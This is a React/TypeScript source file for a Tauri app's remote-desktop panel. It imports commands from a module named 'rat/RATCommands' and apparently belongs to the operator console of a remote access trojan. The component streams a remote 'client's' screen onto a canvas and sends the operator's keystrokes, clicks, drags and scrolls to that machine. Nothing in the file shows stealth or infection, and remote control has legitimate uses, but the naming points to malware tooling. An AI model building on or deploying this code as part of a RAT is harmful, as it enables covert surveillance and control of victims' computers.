import React, { useEffect, useRef, useState } from "react";
import { listen } from "@tauri-apps/api/event";
import { getCurrent, WebviewWindow } from "@tauri-apps/api/window";
import { useParams } from "react-router-dom";
import {
  startRemoteDesktopCmd,
  stopRemoteDesktopCmd,
  fetchClientCmd,
  sendKeyboardInputCmd,
  sendMouseClickCmd,
} from "../rat/RATCommands";

import {
  IconHandClick,
  IconKeyboard,
  IconAdjustmentsAlt,
} from "@tabler/icons-react";

interface RemoteDesktopFramePayload {
  addr: string;
  timestamp: number;
  display: number;
  data: string;
}

export const RemoteDesktop: React.FC = () => {
  const { addr } = useParams();

  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastFrameRef = useRef<HTMLImageElement | null>(null);
  const imageSizeRef = useRef<{ width: number; height: number }>({
    width: 0,
    height: 0,
  });
  const [showControls, setShowControls] = useState(true);
  const [streaming, setStreaming] = useState(false);
  const [quality, setQuality] = useState(35);
  const [fps, setFps] = useState(10);
  const [displays, setDisplays] = useState<number[]>([]);
  const [selectedDisplay, setSelectedDisplay] = useState(0);
  const [connectionStatus, setConnectionStatus] =
    useState<string>("Ready to connect");
  const currentWindow = useRef<WebviewWindow | null>(null);
  const [mouseControlEnabled, setMouseControlEnabled] = useState(false);
  const [keyboardControlEnabled, setKeyboardControlEnabled] = useState(false);
  const [isDragging, setIsDragging] = useState(false);
  const [isMouseDown, setIsMouseDown] = useState(false);
  const [activeMouseButton, setActiveMouseButton] = useState<number | null>(
    null
  );
  const [capsLockState, setCapsLockState] = useState(false);
  const [ctrlKeyState, setCtrlKeyState] = useState(false);

  useEffect(() => {
    currentWindow.current = getCurrent();
  }, [addr]);

  useEffect(() => {
    lastFrameRef.current = new Image();

    const grabDisplayData = async () => {
      try {
        const clientInfo: any = await fetchClientCmd(addr);
        if (clientInfo && clientInfo.displays) {
          const displayArray = Array.from(
            { length: clientInfo.displays },
            (_, i) => i
          );
          setDisplays(displayArray);
        }
      } catch (error) {
        console.error("Failed to initialize window", error);
      }
    };

    grabDisplayData();

    return () => {
      if (streaming) {
        stopStreamingAndCleanup();
      }
    };
  }, []);

  // Set up keyboard event listeners when keyboard control is enabled/disabled
  useEffect(() => {
    // Only add keyboard event listeners if streaming and keyboard control is enabled
    if (!streaming || !keyboardControlEnabled || !addr) return;

    // Function to handle key down events
    const handleKeyDown = (event: KeyboardEvent) => {
      // Prevent default behavior for all keys when keyboard control is enabled
      // This prevents browser shortcuts from activating
      event.preventDefault();

      // Get key information
      const keyCode = event.keyCode;
      let character = event.key;

      // Check if modifiers are pressed
      const shiftPressed = event.shiftKey;
      const ctrlPressed = event.ctrlKey;

      // Update state for UI indicators
      setCtrlKeyState(ctrlPressed);

      // Check caps lock state
      const capsLock = event.getModifierState("CapsLock");
      setCapsLockState(capsLock);

      // Special keys handling - for these keys we want to use the keyCode and not the character
      const isSpecialKey =
        character.length > 1 || // Non-printable characters
        (keyCode >= 33 && keyCode <= 40) || // Page up/down, End, Home, Arrow keys
        keyCode === 13 || // Enter
        keyCode === 8 || // Backspace
        keyCode === 9 || // Tab
        keyCode === 27 || // Escape
        keyCode === 46; // Delete

      // If it's a special key, set character to empty as we'll use keyCode
      if (isSpecialKey) {
        character = "";
      }

      // Send the keyboard input to the client
      sendKeyboardInputCmd(
        addr,
        keyCode,
        character,
        true,
        shiftPressed,
        ctrlPressed && !isSpecialKey, // Only send ctrl for non-special keys unless actually pressed with Ctrl
        capsLock
      ).catch((error) => {
        console.error("Error sending keyboard down event:", error);
      });
    };

    // Function to handle key up events
    const handleKeyUp = (event: KeyboardEvent) => {
      event.preventDefault();

      const keyCode = event.keyCode;
      let character = event.key;

      const shiftPressed = event.shiftKey;
      const ctrlPressed = event.ctrlKey;

      // Update state for UI indicators
      setCtrlKeyState(ctrlPressed);

      const capsLock = event.getModifierState("CapsLock");
      setCapsLockState(capsLock);

      // Special keys handling
      const isSpecialKey =
        character.length > 1 || // Non-printable characters
        (keyCode >= 33 && keyCode <= 40) || // Page up/down, End, Home, Arrow keys
        keyCode === 13 || // Enter
        keyCode === 8 || // Backspace
        keyCode === 9 || // Tab
        keyCode === 27 || // Escape
        keyCode === 46; // Delete

      // If it's a special key, set character to empty
      if (isSpecialKey) {
        character = "";
      }

      sendKeyboardInputCmd(
        addr,
        keyCode,
        character,
        false,
        shiftPressed,
        ctrlPressed && !isSpecialKey,
        capsLock
      ).catch((error) => {
        console.error("Error sending keyboard up event:", error);
      });
    };

    // Add event listeners to the document
    document.addEventListener("keydown", handleKeyDown);
    document.addEventListener("keyup", handleKeyUp);

    // Clean up function to remove event listeners
    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      document.removeEventListener("keyup", handleKeyUp);
    };
  }, [streaming, keyboardControlEnabled, addr]);

  useEffect(() => {
    const unlisten = listen("remote_desktop_frame", (event) => {
      const payload = event.payload as RemoteDesktopFramePayload;

      if (payload.addr !== addr) {
        return;
      }

      if (payload.display !== selectedDisplay) {
        return;
      }

      if (canvasRef.current && lastFrameRef.current) {
        const ctx = canvasRef.current.getContext("2d");
        if (ctx) {
          lastFrameRef.current.src = `data:image/jpeg;base64,${payload.data}`;

          lastFrameRef.current.onload = () => {
            if (ctx && canvasRef.current && lastFrameRef.current) {
              imageSizeRef.current = {
                width: lastFrameRef.current.width,
                height: lastFrameRef.current.height,
              };

              canvasRef.current.width = lastFrameRef.current.width;
              canvasRef.current.height = lastFrameRef.current.height;

              ctx.drawImage(
                lastFrameRef.current,
                0,
                0,
                lastFrameRef.current.width,
                lastFrameRef.current.height
              );
            }
          };
        }
      }
    });

    return () => {
      unlisten.then((fn) => fn());
    };
  }, [selectedDisplay]);

  // Function to reset client-side keyboard state
  const resetClientKeyboardState = async () => {
    if (!addr) return;

    try {
      // Send key up events for all modifier keys
      sendKeyboardInputCmd(
        addr,
        0, // Not using a specific key code
        "",
        false, // Key up event
        false,
        false,
        false
      );

      // Also reset our UI state
      setCapsLockState(false);
      setCtrlKeyState(false);
    } catch (error) {
      console.error("Error resetting keyboard state:", error);
    }
  };

  // Effect to clean up keyboard state when keyboard control is disabled or streaming stops
  useEffect(() => {
    if (!keyboardControlEnabled || !streaming) {
      // Reset both UI indicators and client-side state
      resetClientKeyboardState();
    }
  }, [keyboardControlEnabled, streaming]);

  const stopStreamingAndCleanup = async () => {
    if (!streaming) return;

    try {
      await stopRemoteDesktopCmd(addr);
      setStreaming(false);
      setConnectionStatus("Disconnected");
    } catch (error) {
      console.error("Error cleaning up streaming:", error);
    }
  };

  const handleStartStreaming = async () => {
    setConnectionStatus("Connecting...");
    try {
      await startRemoteDesktopCmd(addr, selectedDisplay, quality, fps);
      setStreaming(true);
      setConnectionStatus("Connected");
    } catch (error) {
      console.error("Error starting remote desktop:", error);
      setConnectionStatus(" ");
    }
  };

  const handleStopStreaming = async () => {
    await stopStreamingAndCleanup();
    setConnectionStatus("Ready to connect");
  };

  const switchDisplay = async (newDisplay: number) => {
    if (streaming) {
      await stopRemoteDesktopCmd(addr);

      setSelectedDisplay(newDisplay);

      await startRemoteDesktopCmd(addr, newDisplay, quality, fps);
    } else {
      setSelectedDisplay(newDisplay);
    }
  };

  // Convert client coordinates to remote screen coordinates
  const getTargetCoordinates = (clientX: number, clientY: number) => {
    if (!canvasRef.current) return { targetX: 0, targetY: 0 };

    const rect = canvasRef.current.getBoundingClientRect();
    const scaleFactorX = imageSizeRef.current.width / rect.width;
    const scaleFactorY = imageSizeRef.current.height / rect.height;

    const canvasX = clientX - rect.left;
    const canvasY = clientY - rect.top;

    const targetX = Math.round(canvasX * scaleFactorX);
    const targetY = Math.round(canvasY * scaleFactorY);

    return { targetX, targetY };
  };

  // Handler for mouse down event
  const handleCanvasMouseDown = async (
    event: React.MouseEvent<HTMLCanvasElement>
  ) => {
    event.preventDefault();

    if (!mouseControlEnabled || !canvasRef.current || !addr || !streaming)
      return;

    // Handle middle mouse button (button 1) and left/right buttons (0 and 2)
    if (event.button !== 0 && event.button !== 1 && event.button !== 2) {
      return;
    }

    setIsMouseDown(true);
    setActiveMouseButton(event.button);

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );

    try {
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        event.button,
        1,
        0
      );
    } catch (error) {
      console.error("Error sending mouse down event:", error);
    }
  };

  // Handler for mouse up event
  const handleCanvasMouseUp = async (
    event: React.MouseEvent<HTMLCanvasElement>
  ) => {
    event.preventDefault();

    if (
      !mouseControlEnabled ||
      !canvasRef.current ||
      !addr ||
      !streaming ||
      !isMouseDown
    )
      return;

    if (activeMouseButton !== null && event.button !== activeMouseButton) {
      return; // Only handle the button that was pressed down
    }

    setIsMouseDown(false);
    setIsDragging(false);
    setActiveMouseButton(null);

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );

    try {
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        event.button,
        2, // Mouse up
        0
      );
    } catch (error) {
      console.error("Error sending mouse up event:", error);
    }
  };

  // Handler for mouse move event during dragging
  const handleCanvasMouseMove = async (
    event: React.MouseEvent<HTMLCanvasElement>
  ) => {
    if (
      !mouseControlEnabled ||
      !canvasRef.current ||
      !addr ||
      !streaming ||
      !isMouseDown
    )
      return;

    setIsDragging(true);

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );

    try {
      // Just update the cursor position without changing button state
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        activeMouseButton || 0,
        3, // Mouse move during drag (custom action type)
        0
      );
    } catch (error) {
      console.error("Error sending mouse move event:", error);
    }
  };

  // Handler for wheel events (scrolling)
  const handleCanvasWheel = async (
    event: React.WheelEvent<HTMLCanvasElement>
  ) => {
    event.preventDefault();

    if (!mouseControlEnabled || !canvasRef.current || !addr || !streaming)
      return;

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );

    // Determine scroll direction and amount
    // Normalize the amount to a reasonable value
    const scrollAmount = Math.max(
      1,
      Math.min(10, Math.abs(Math.round(event.deltaY / 100)))
    );
    const isScrollUp = event.deltaY < 0;

    try {
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        3, // Scroll action
        isScrollUp ? 4 : 5, // 4 for up, 5 for down
        scrollAmount
      );
    } catch (error) {
      console.error("Error sending scroll event:", error);
    }
  };

  // Legacy click handler for backward compatibility
  const handleCanvasClick = async (
    event: React.MouseEvent<HTMLCanvasElement>
  ) => {
    event.preventDefault();

    if (!mouseControlEnabled || !canvasRef.current || !addr || !streaming)
      return;

    if (event.button !== 0 && event.button !== 1 && event.button !== 2) {
      return;
    }

    // Only process as a click if we haven't detected a drag operation
    if (isDragging) return;

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );

    try {
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        event.button,
        0, // Complete click (down+up)
        0
      );
    } catch (error) {
      console.error("Error sending mouse click:", error);
    }
  };

  const toggleKeyboardControl = () => {
    const newState = !keyboardControlEnabled;
    setKeyboardControlEnabled(newState);

    // Reset keyboard state when disabling keyboard control
    if (!newState && streaming) {
      resetClientKeyboardState();
    }
  };

  const toggleControls = () => {
    setShowControls(!showControls);
  };

  const toggleMouseControl = () => {
    setMouseControlEnabled(!mouseControlEnabled);
    // Reset drag state when disabling mouse control
    if (!mouseControlEnabled) {
      setIsMouseDown(false);
      setIsDragging(false);
      setActiveMouseButton(null);
    }
  };

  const displayOptions = displays.map((displayId) => (
    <option key={displayId} value={displayId}>
      {displayId}
    </option>
  ));

  return (
    <div className="relative w-screen h-screen bg-black flex flex-col items-center p-0 m-0">
      <div className="fixed top-2 left-2 z-10 bg-primarybg bg-opacity-70 text-white p-2 rounded-full transition-opacity flex flex-col gap-2">
        <button
          className={`text-white p-2 rounded-full opacity-70 hover:opacity-100 transition-opacity cursor-pointer ${
            !showControls ? "bg-secondarybg" : "bg-white"
          }`}
          onClick={toggleControls}
          title={showControls ? "Hide Controls" : "Show Controls"}
        >
          <IconAdjustmentsAlt
            size={22}
            color={!showControls ? "white" : "black"}
          />
        </button>

        <button
          className={`p-2 rounded-full opacity-70 hover:opacity-100 transition-opacity cursor-pointer ${
            mouseControlEnabled ? "bg-white" : "bg-secondarybg"
          }`}
          onClick={toggleMouseControl}
          title={
            mouseControlEnabled
              ? "Disable Mouse Control"
              : "Enable Mouse Control"
          }
        >
          <IconHandClick
            size={22}
            color={mouseControlEnabled ? "black" : "white"}
          />
        </button>

        <button
          className={`p-2 rounded-full opacity-70 hover:opacity-100 transition-opacity cursor-pointer ${
            keyboardControlEnabled ? "bg-white" : "bg-secondarybg"
          }`}
          onClick={toggleKeyboardControl}
          title={
            keyboardControlEnabled
              ? "Disable Keyboard Control"
              : "Enable Keyboard Control"
          }
        >
          <IconKeyboard
            size={22}
            color={keyboardControlEnabled ? "black" : "white"}
          />
        </button>
      </div>

      {showControls && (
        <div className="absolute top-2 z-10 bg-primarybg bg-opacity-80 p-3 rounded-2xl flex flex-col items-center gap-3 text-white min-w-[300px]">
          <div className="flex w-full justify-between items-center">
            <h3 className="text-sm font-medium">Remote Desktop</h3>
            <div className="flex items-center gap-2 pl-3">
              {keyboardControlEnabled && streaming && (
                <span
                  className={`text-xs px-2 py-1 bg-white text-black rounded-2xl ${
                    capsLockState
                      ? "!bg-green-500 !text-black"
                      : "!bg-red-500 !text-black"
                  }`}
                >
                  {capsLockState ? "CAPS" : "CAPS"}
                </span>
              )}
              {keyboardControlEnabled && streaming && (
                <span
                  className={`text-xs px-2 py-1 bg-white text-black rounded-2xl ${
                    ctrlKeyState
                      ? "!bg-green-500 !text-black"
                      : "!bg-red-500 !text-black"
                  }`}
                >
                  CTRL
                </span>
              )}
              <span className="text-xs px-2 py-1 bg-white text-black rounded-2xl border border-accentx">
                {connectionStatus}
              </span>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3 w-full">
            <div className="flex items-center rounded-full bg-secondarybg pl-3 border border-accentx h-9">
              <div className="shrink-0 text-base text-accentx select-none sm:text-sm/6">
                Display
              </div>
              <select
                className={`block w-16 py-0 pl-2 text-base placeholder:text-gray-400 bg-transparent focus:outline-none sm:text-sm/6 ${
                  streaming ? "text-accentx" : "text-white"
                }`}
                value={selectedDisplay}
                onChange={(e) => switchDisplay(Number(e.target.value))}
                disabled={streaming}
              >
                {displayOptions}
              </select>
            </div>

            <div className="flex items-center rounded-full bg-secondarybg pl-3 border border-accentx h-9">
              <div className="shrink-0 text-base text-accentx select-none sm:text-sm/6">
                Quality
              </div>
              <input
                type="number"
                className={`block w-16 py-0 pl-2 text-base placeholder:text-gray-400 bg-transparent focus:outline-none sm:text-sm/6 ${
                  streaming ? "text-accentx" : "text-white"
                }`}
                min="1"
                max="100"
                value={quality}
                onChange={(e) => setQuality(Number(e.target.value))}
                disabled={streaming}
              />
            </div>

            <div className="flex items-center rounded-full bg-secondarybg pl-3 border border-accentx h-9">
              <div className="shrink-0 text-base text-accentx select-none sm:text-sm/6">
                FPS:
              </div>
              <input
                type="number"
                className={`block w-16 py-0 pl-2 text-base placeholder:text-gray-400 bg-transparent focus:outline-none sm:text-sm/6 ${
                  streaming ? "text-accentx" : "text-white"
                }`}
                min="1"
                max="30"
                value={fps}
                onChange={(e) => setFps(Number(e.target.value))}
              />
            </div>

            <div className="flex items-end text-sm">
              {!streaming ? (
                <button
                  className="cursor-pointer rounded-full px-4 py-1.5 border border-accentx bg-active text-white hover:bg-white hover:text-black transition"
                  onClick={handleStartStreaming}
                >
                  Start Streaming
                </button>
              ) : (
                <button
                  className="cursor-pointer rounded-full px-4 py-1.5 border border-accentx bg-inactive text-white hover:bg-white hover:text-black transition"
                  onClick={handleStopStreaming}
                >
                  Stop Streaming
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      <div className="flex-1 flex items-center justify-center w-full h-full">
        <canvas
          ref={canvasRef}
          className="max-h-full max-w-full"
          onMouseDown={handleCanvasMouseDown}
          onMouseUp={handleCanvasMouseUp}
          onMouseMove={handleCanvasMouseMove}
          onWheel={handleCanvasWheel}
          onContextMenu={(event) => event.preventDefault()}
          tabIndex={0} // Make canvas focusable for keyboard events
        />
      </div>

      {keyboardControlEnabled && streaming && (
        <div className="fixed bottom-2 left-2 right-2 z-10 bg-primarybg bg-opacity-70 text-white p-2 rounded-lg text-center">
          <p className="text-sm">
            Keyboard control active. Supported shortcuts: Ctrl+A (Select All),
            Ctrl+C (Copy), Ctrl+V (Paste), Ctrl+X (Cut), Ctrl+Z (Undo), Ctrl+Y
            (Redo), Ctrl+S (Save)
          </p>
        </div>
      )}
    </div>
  );
};
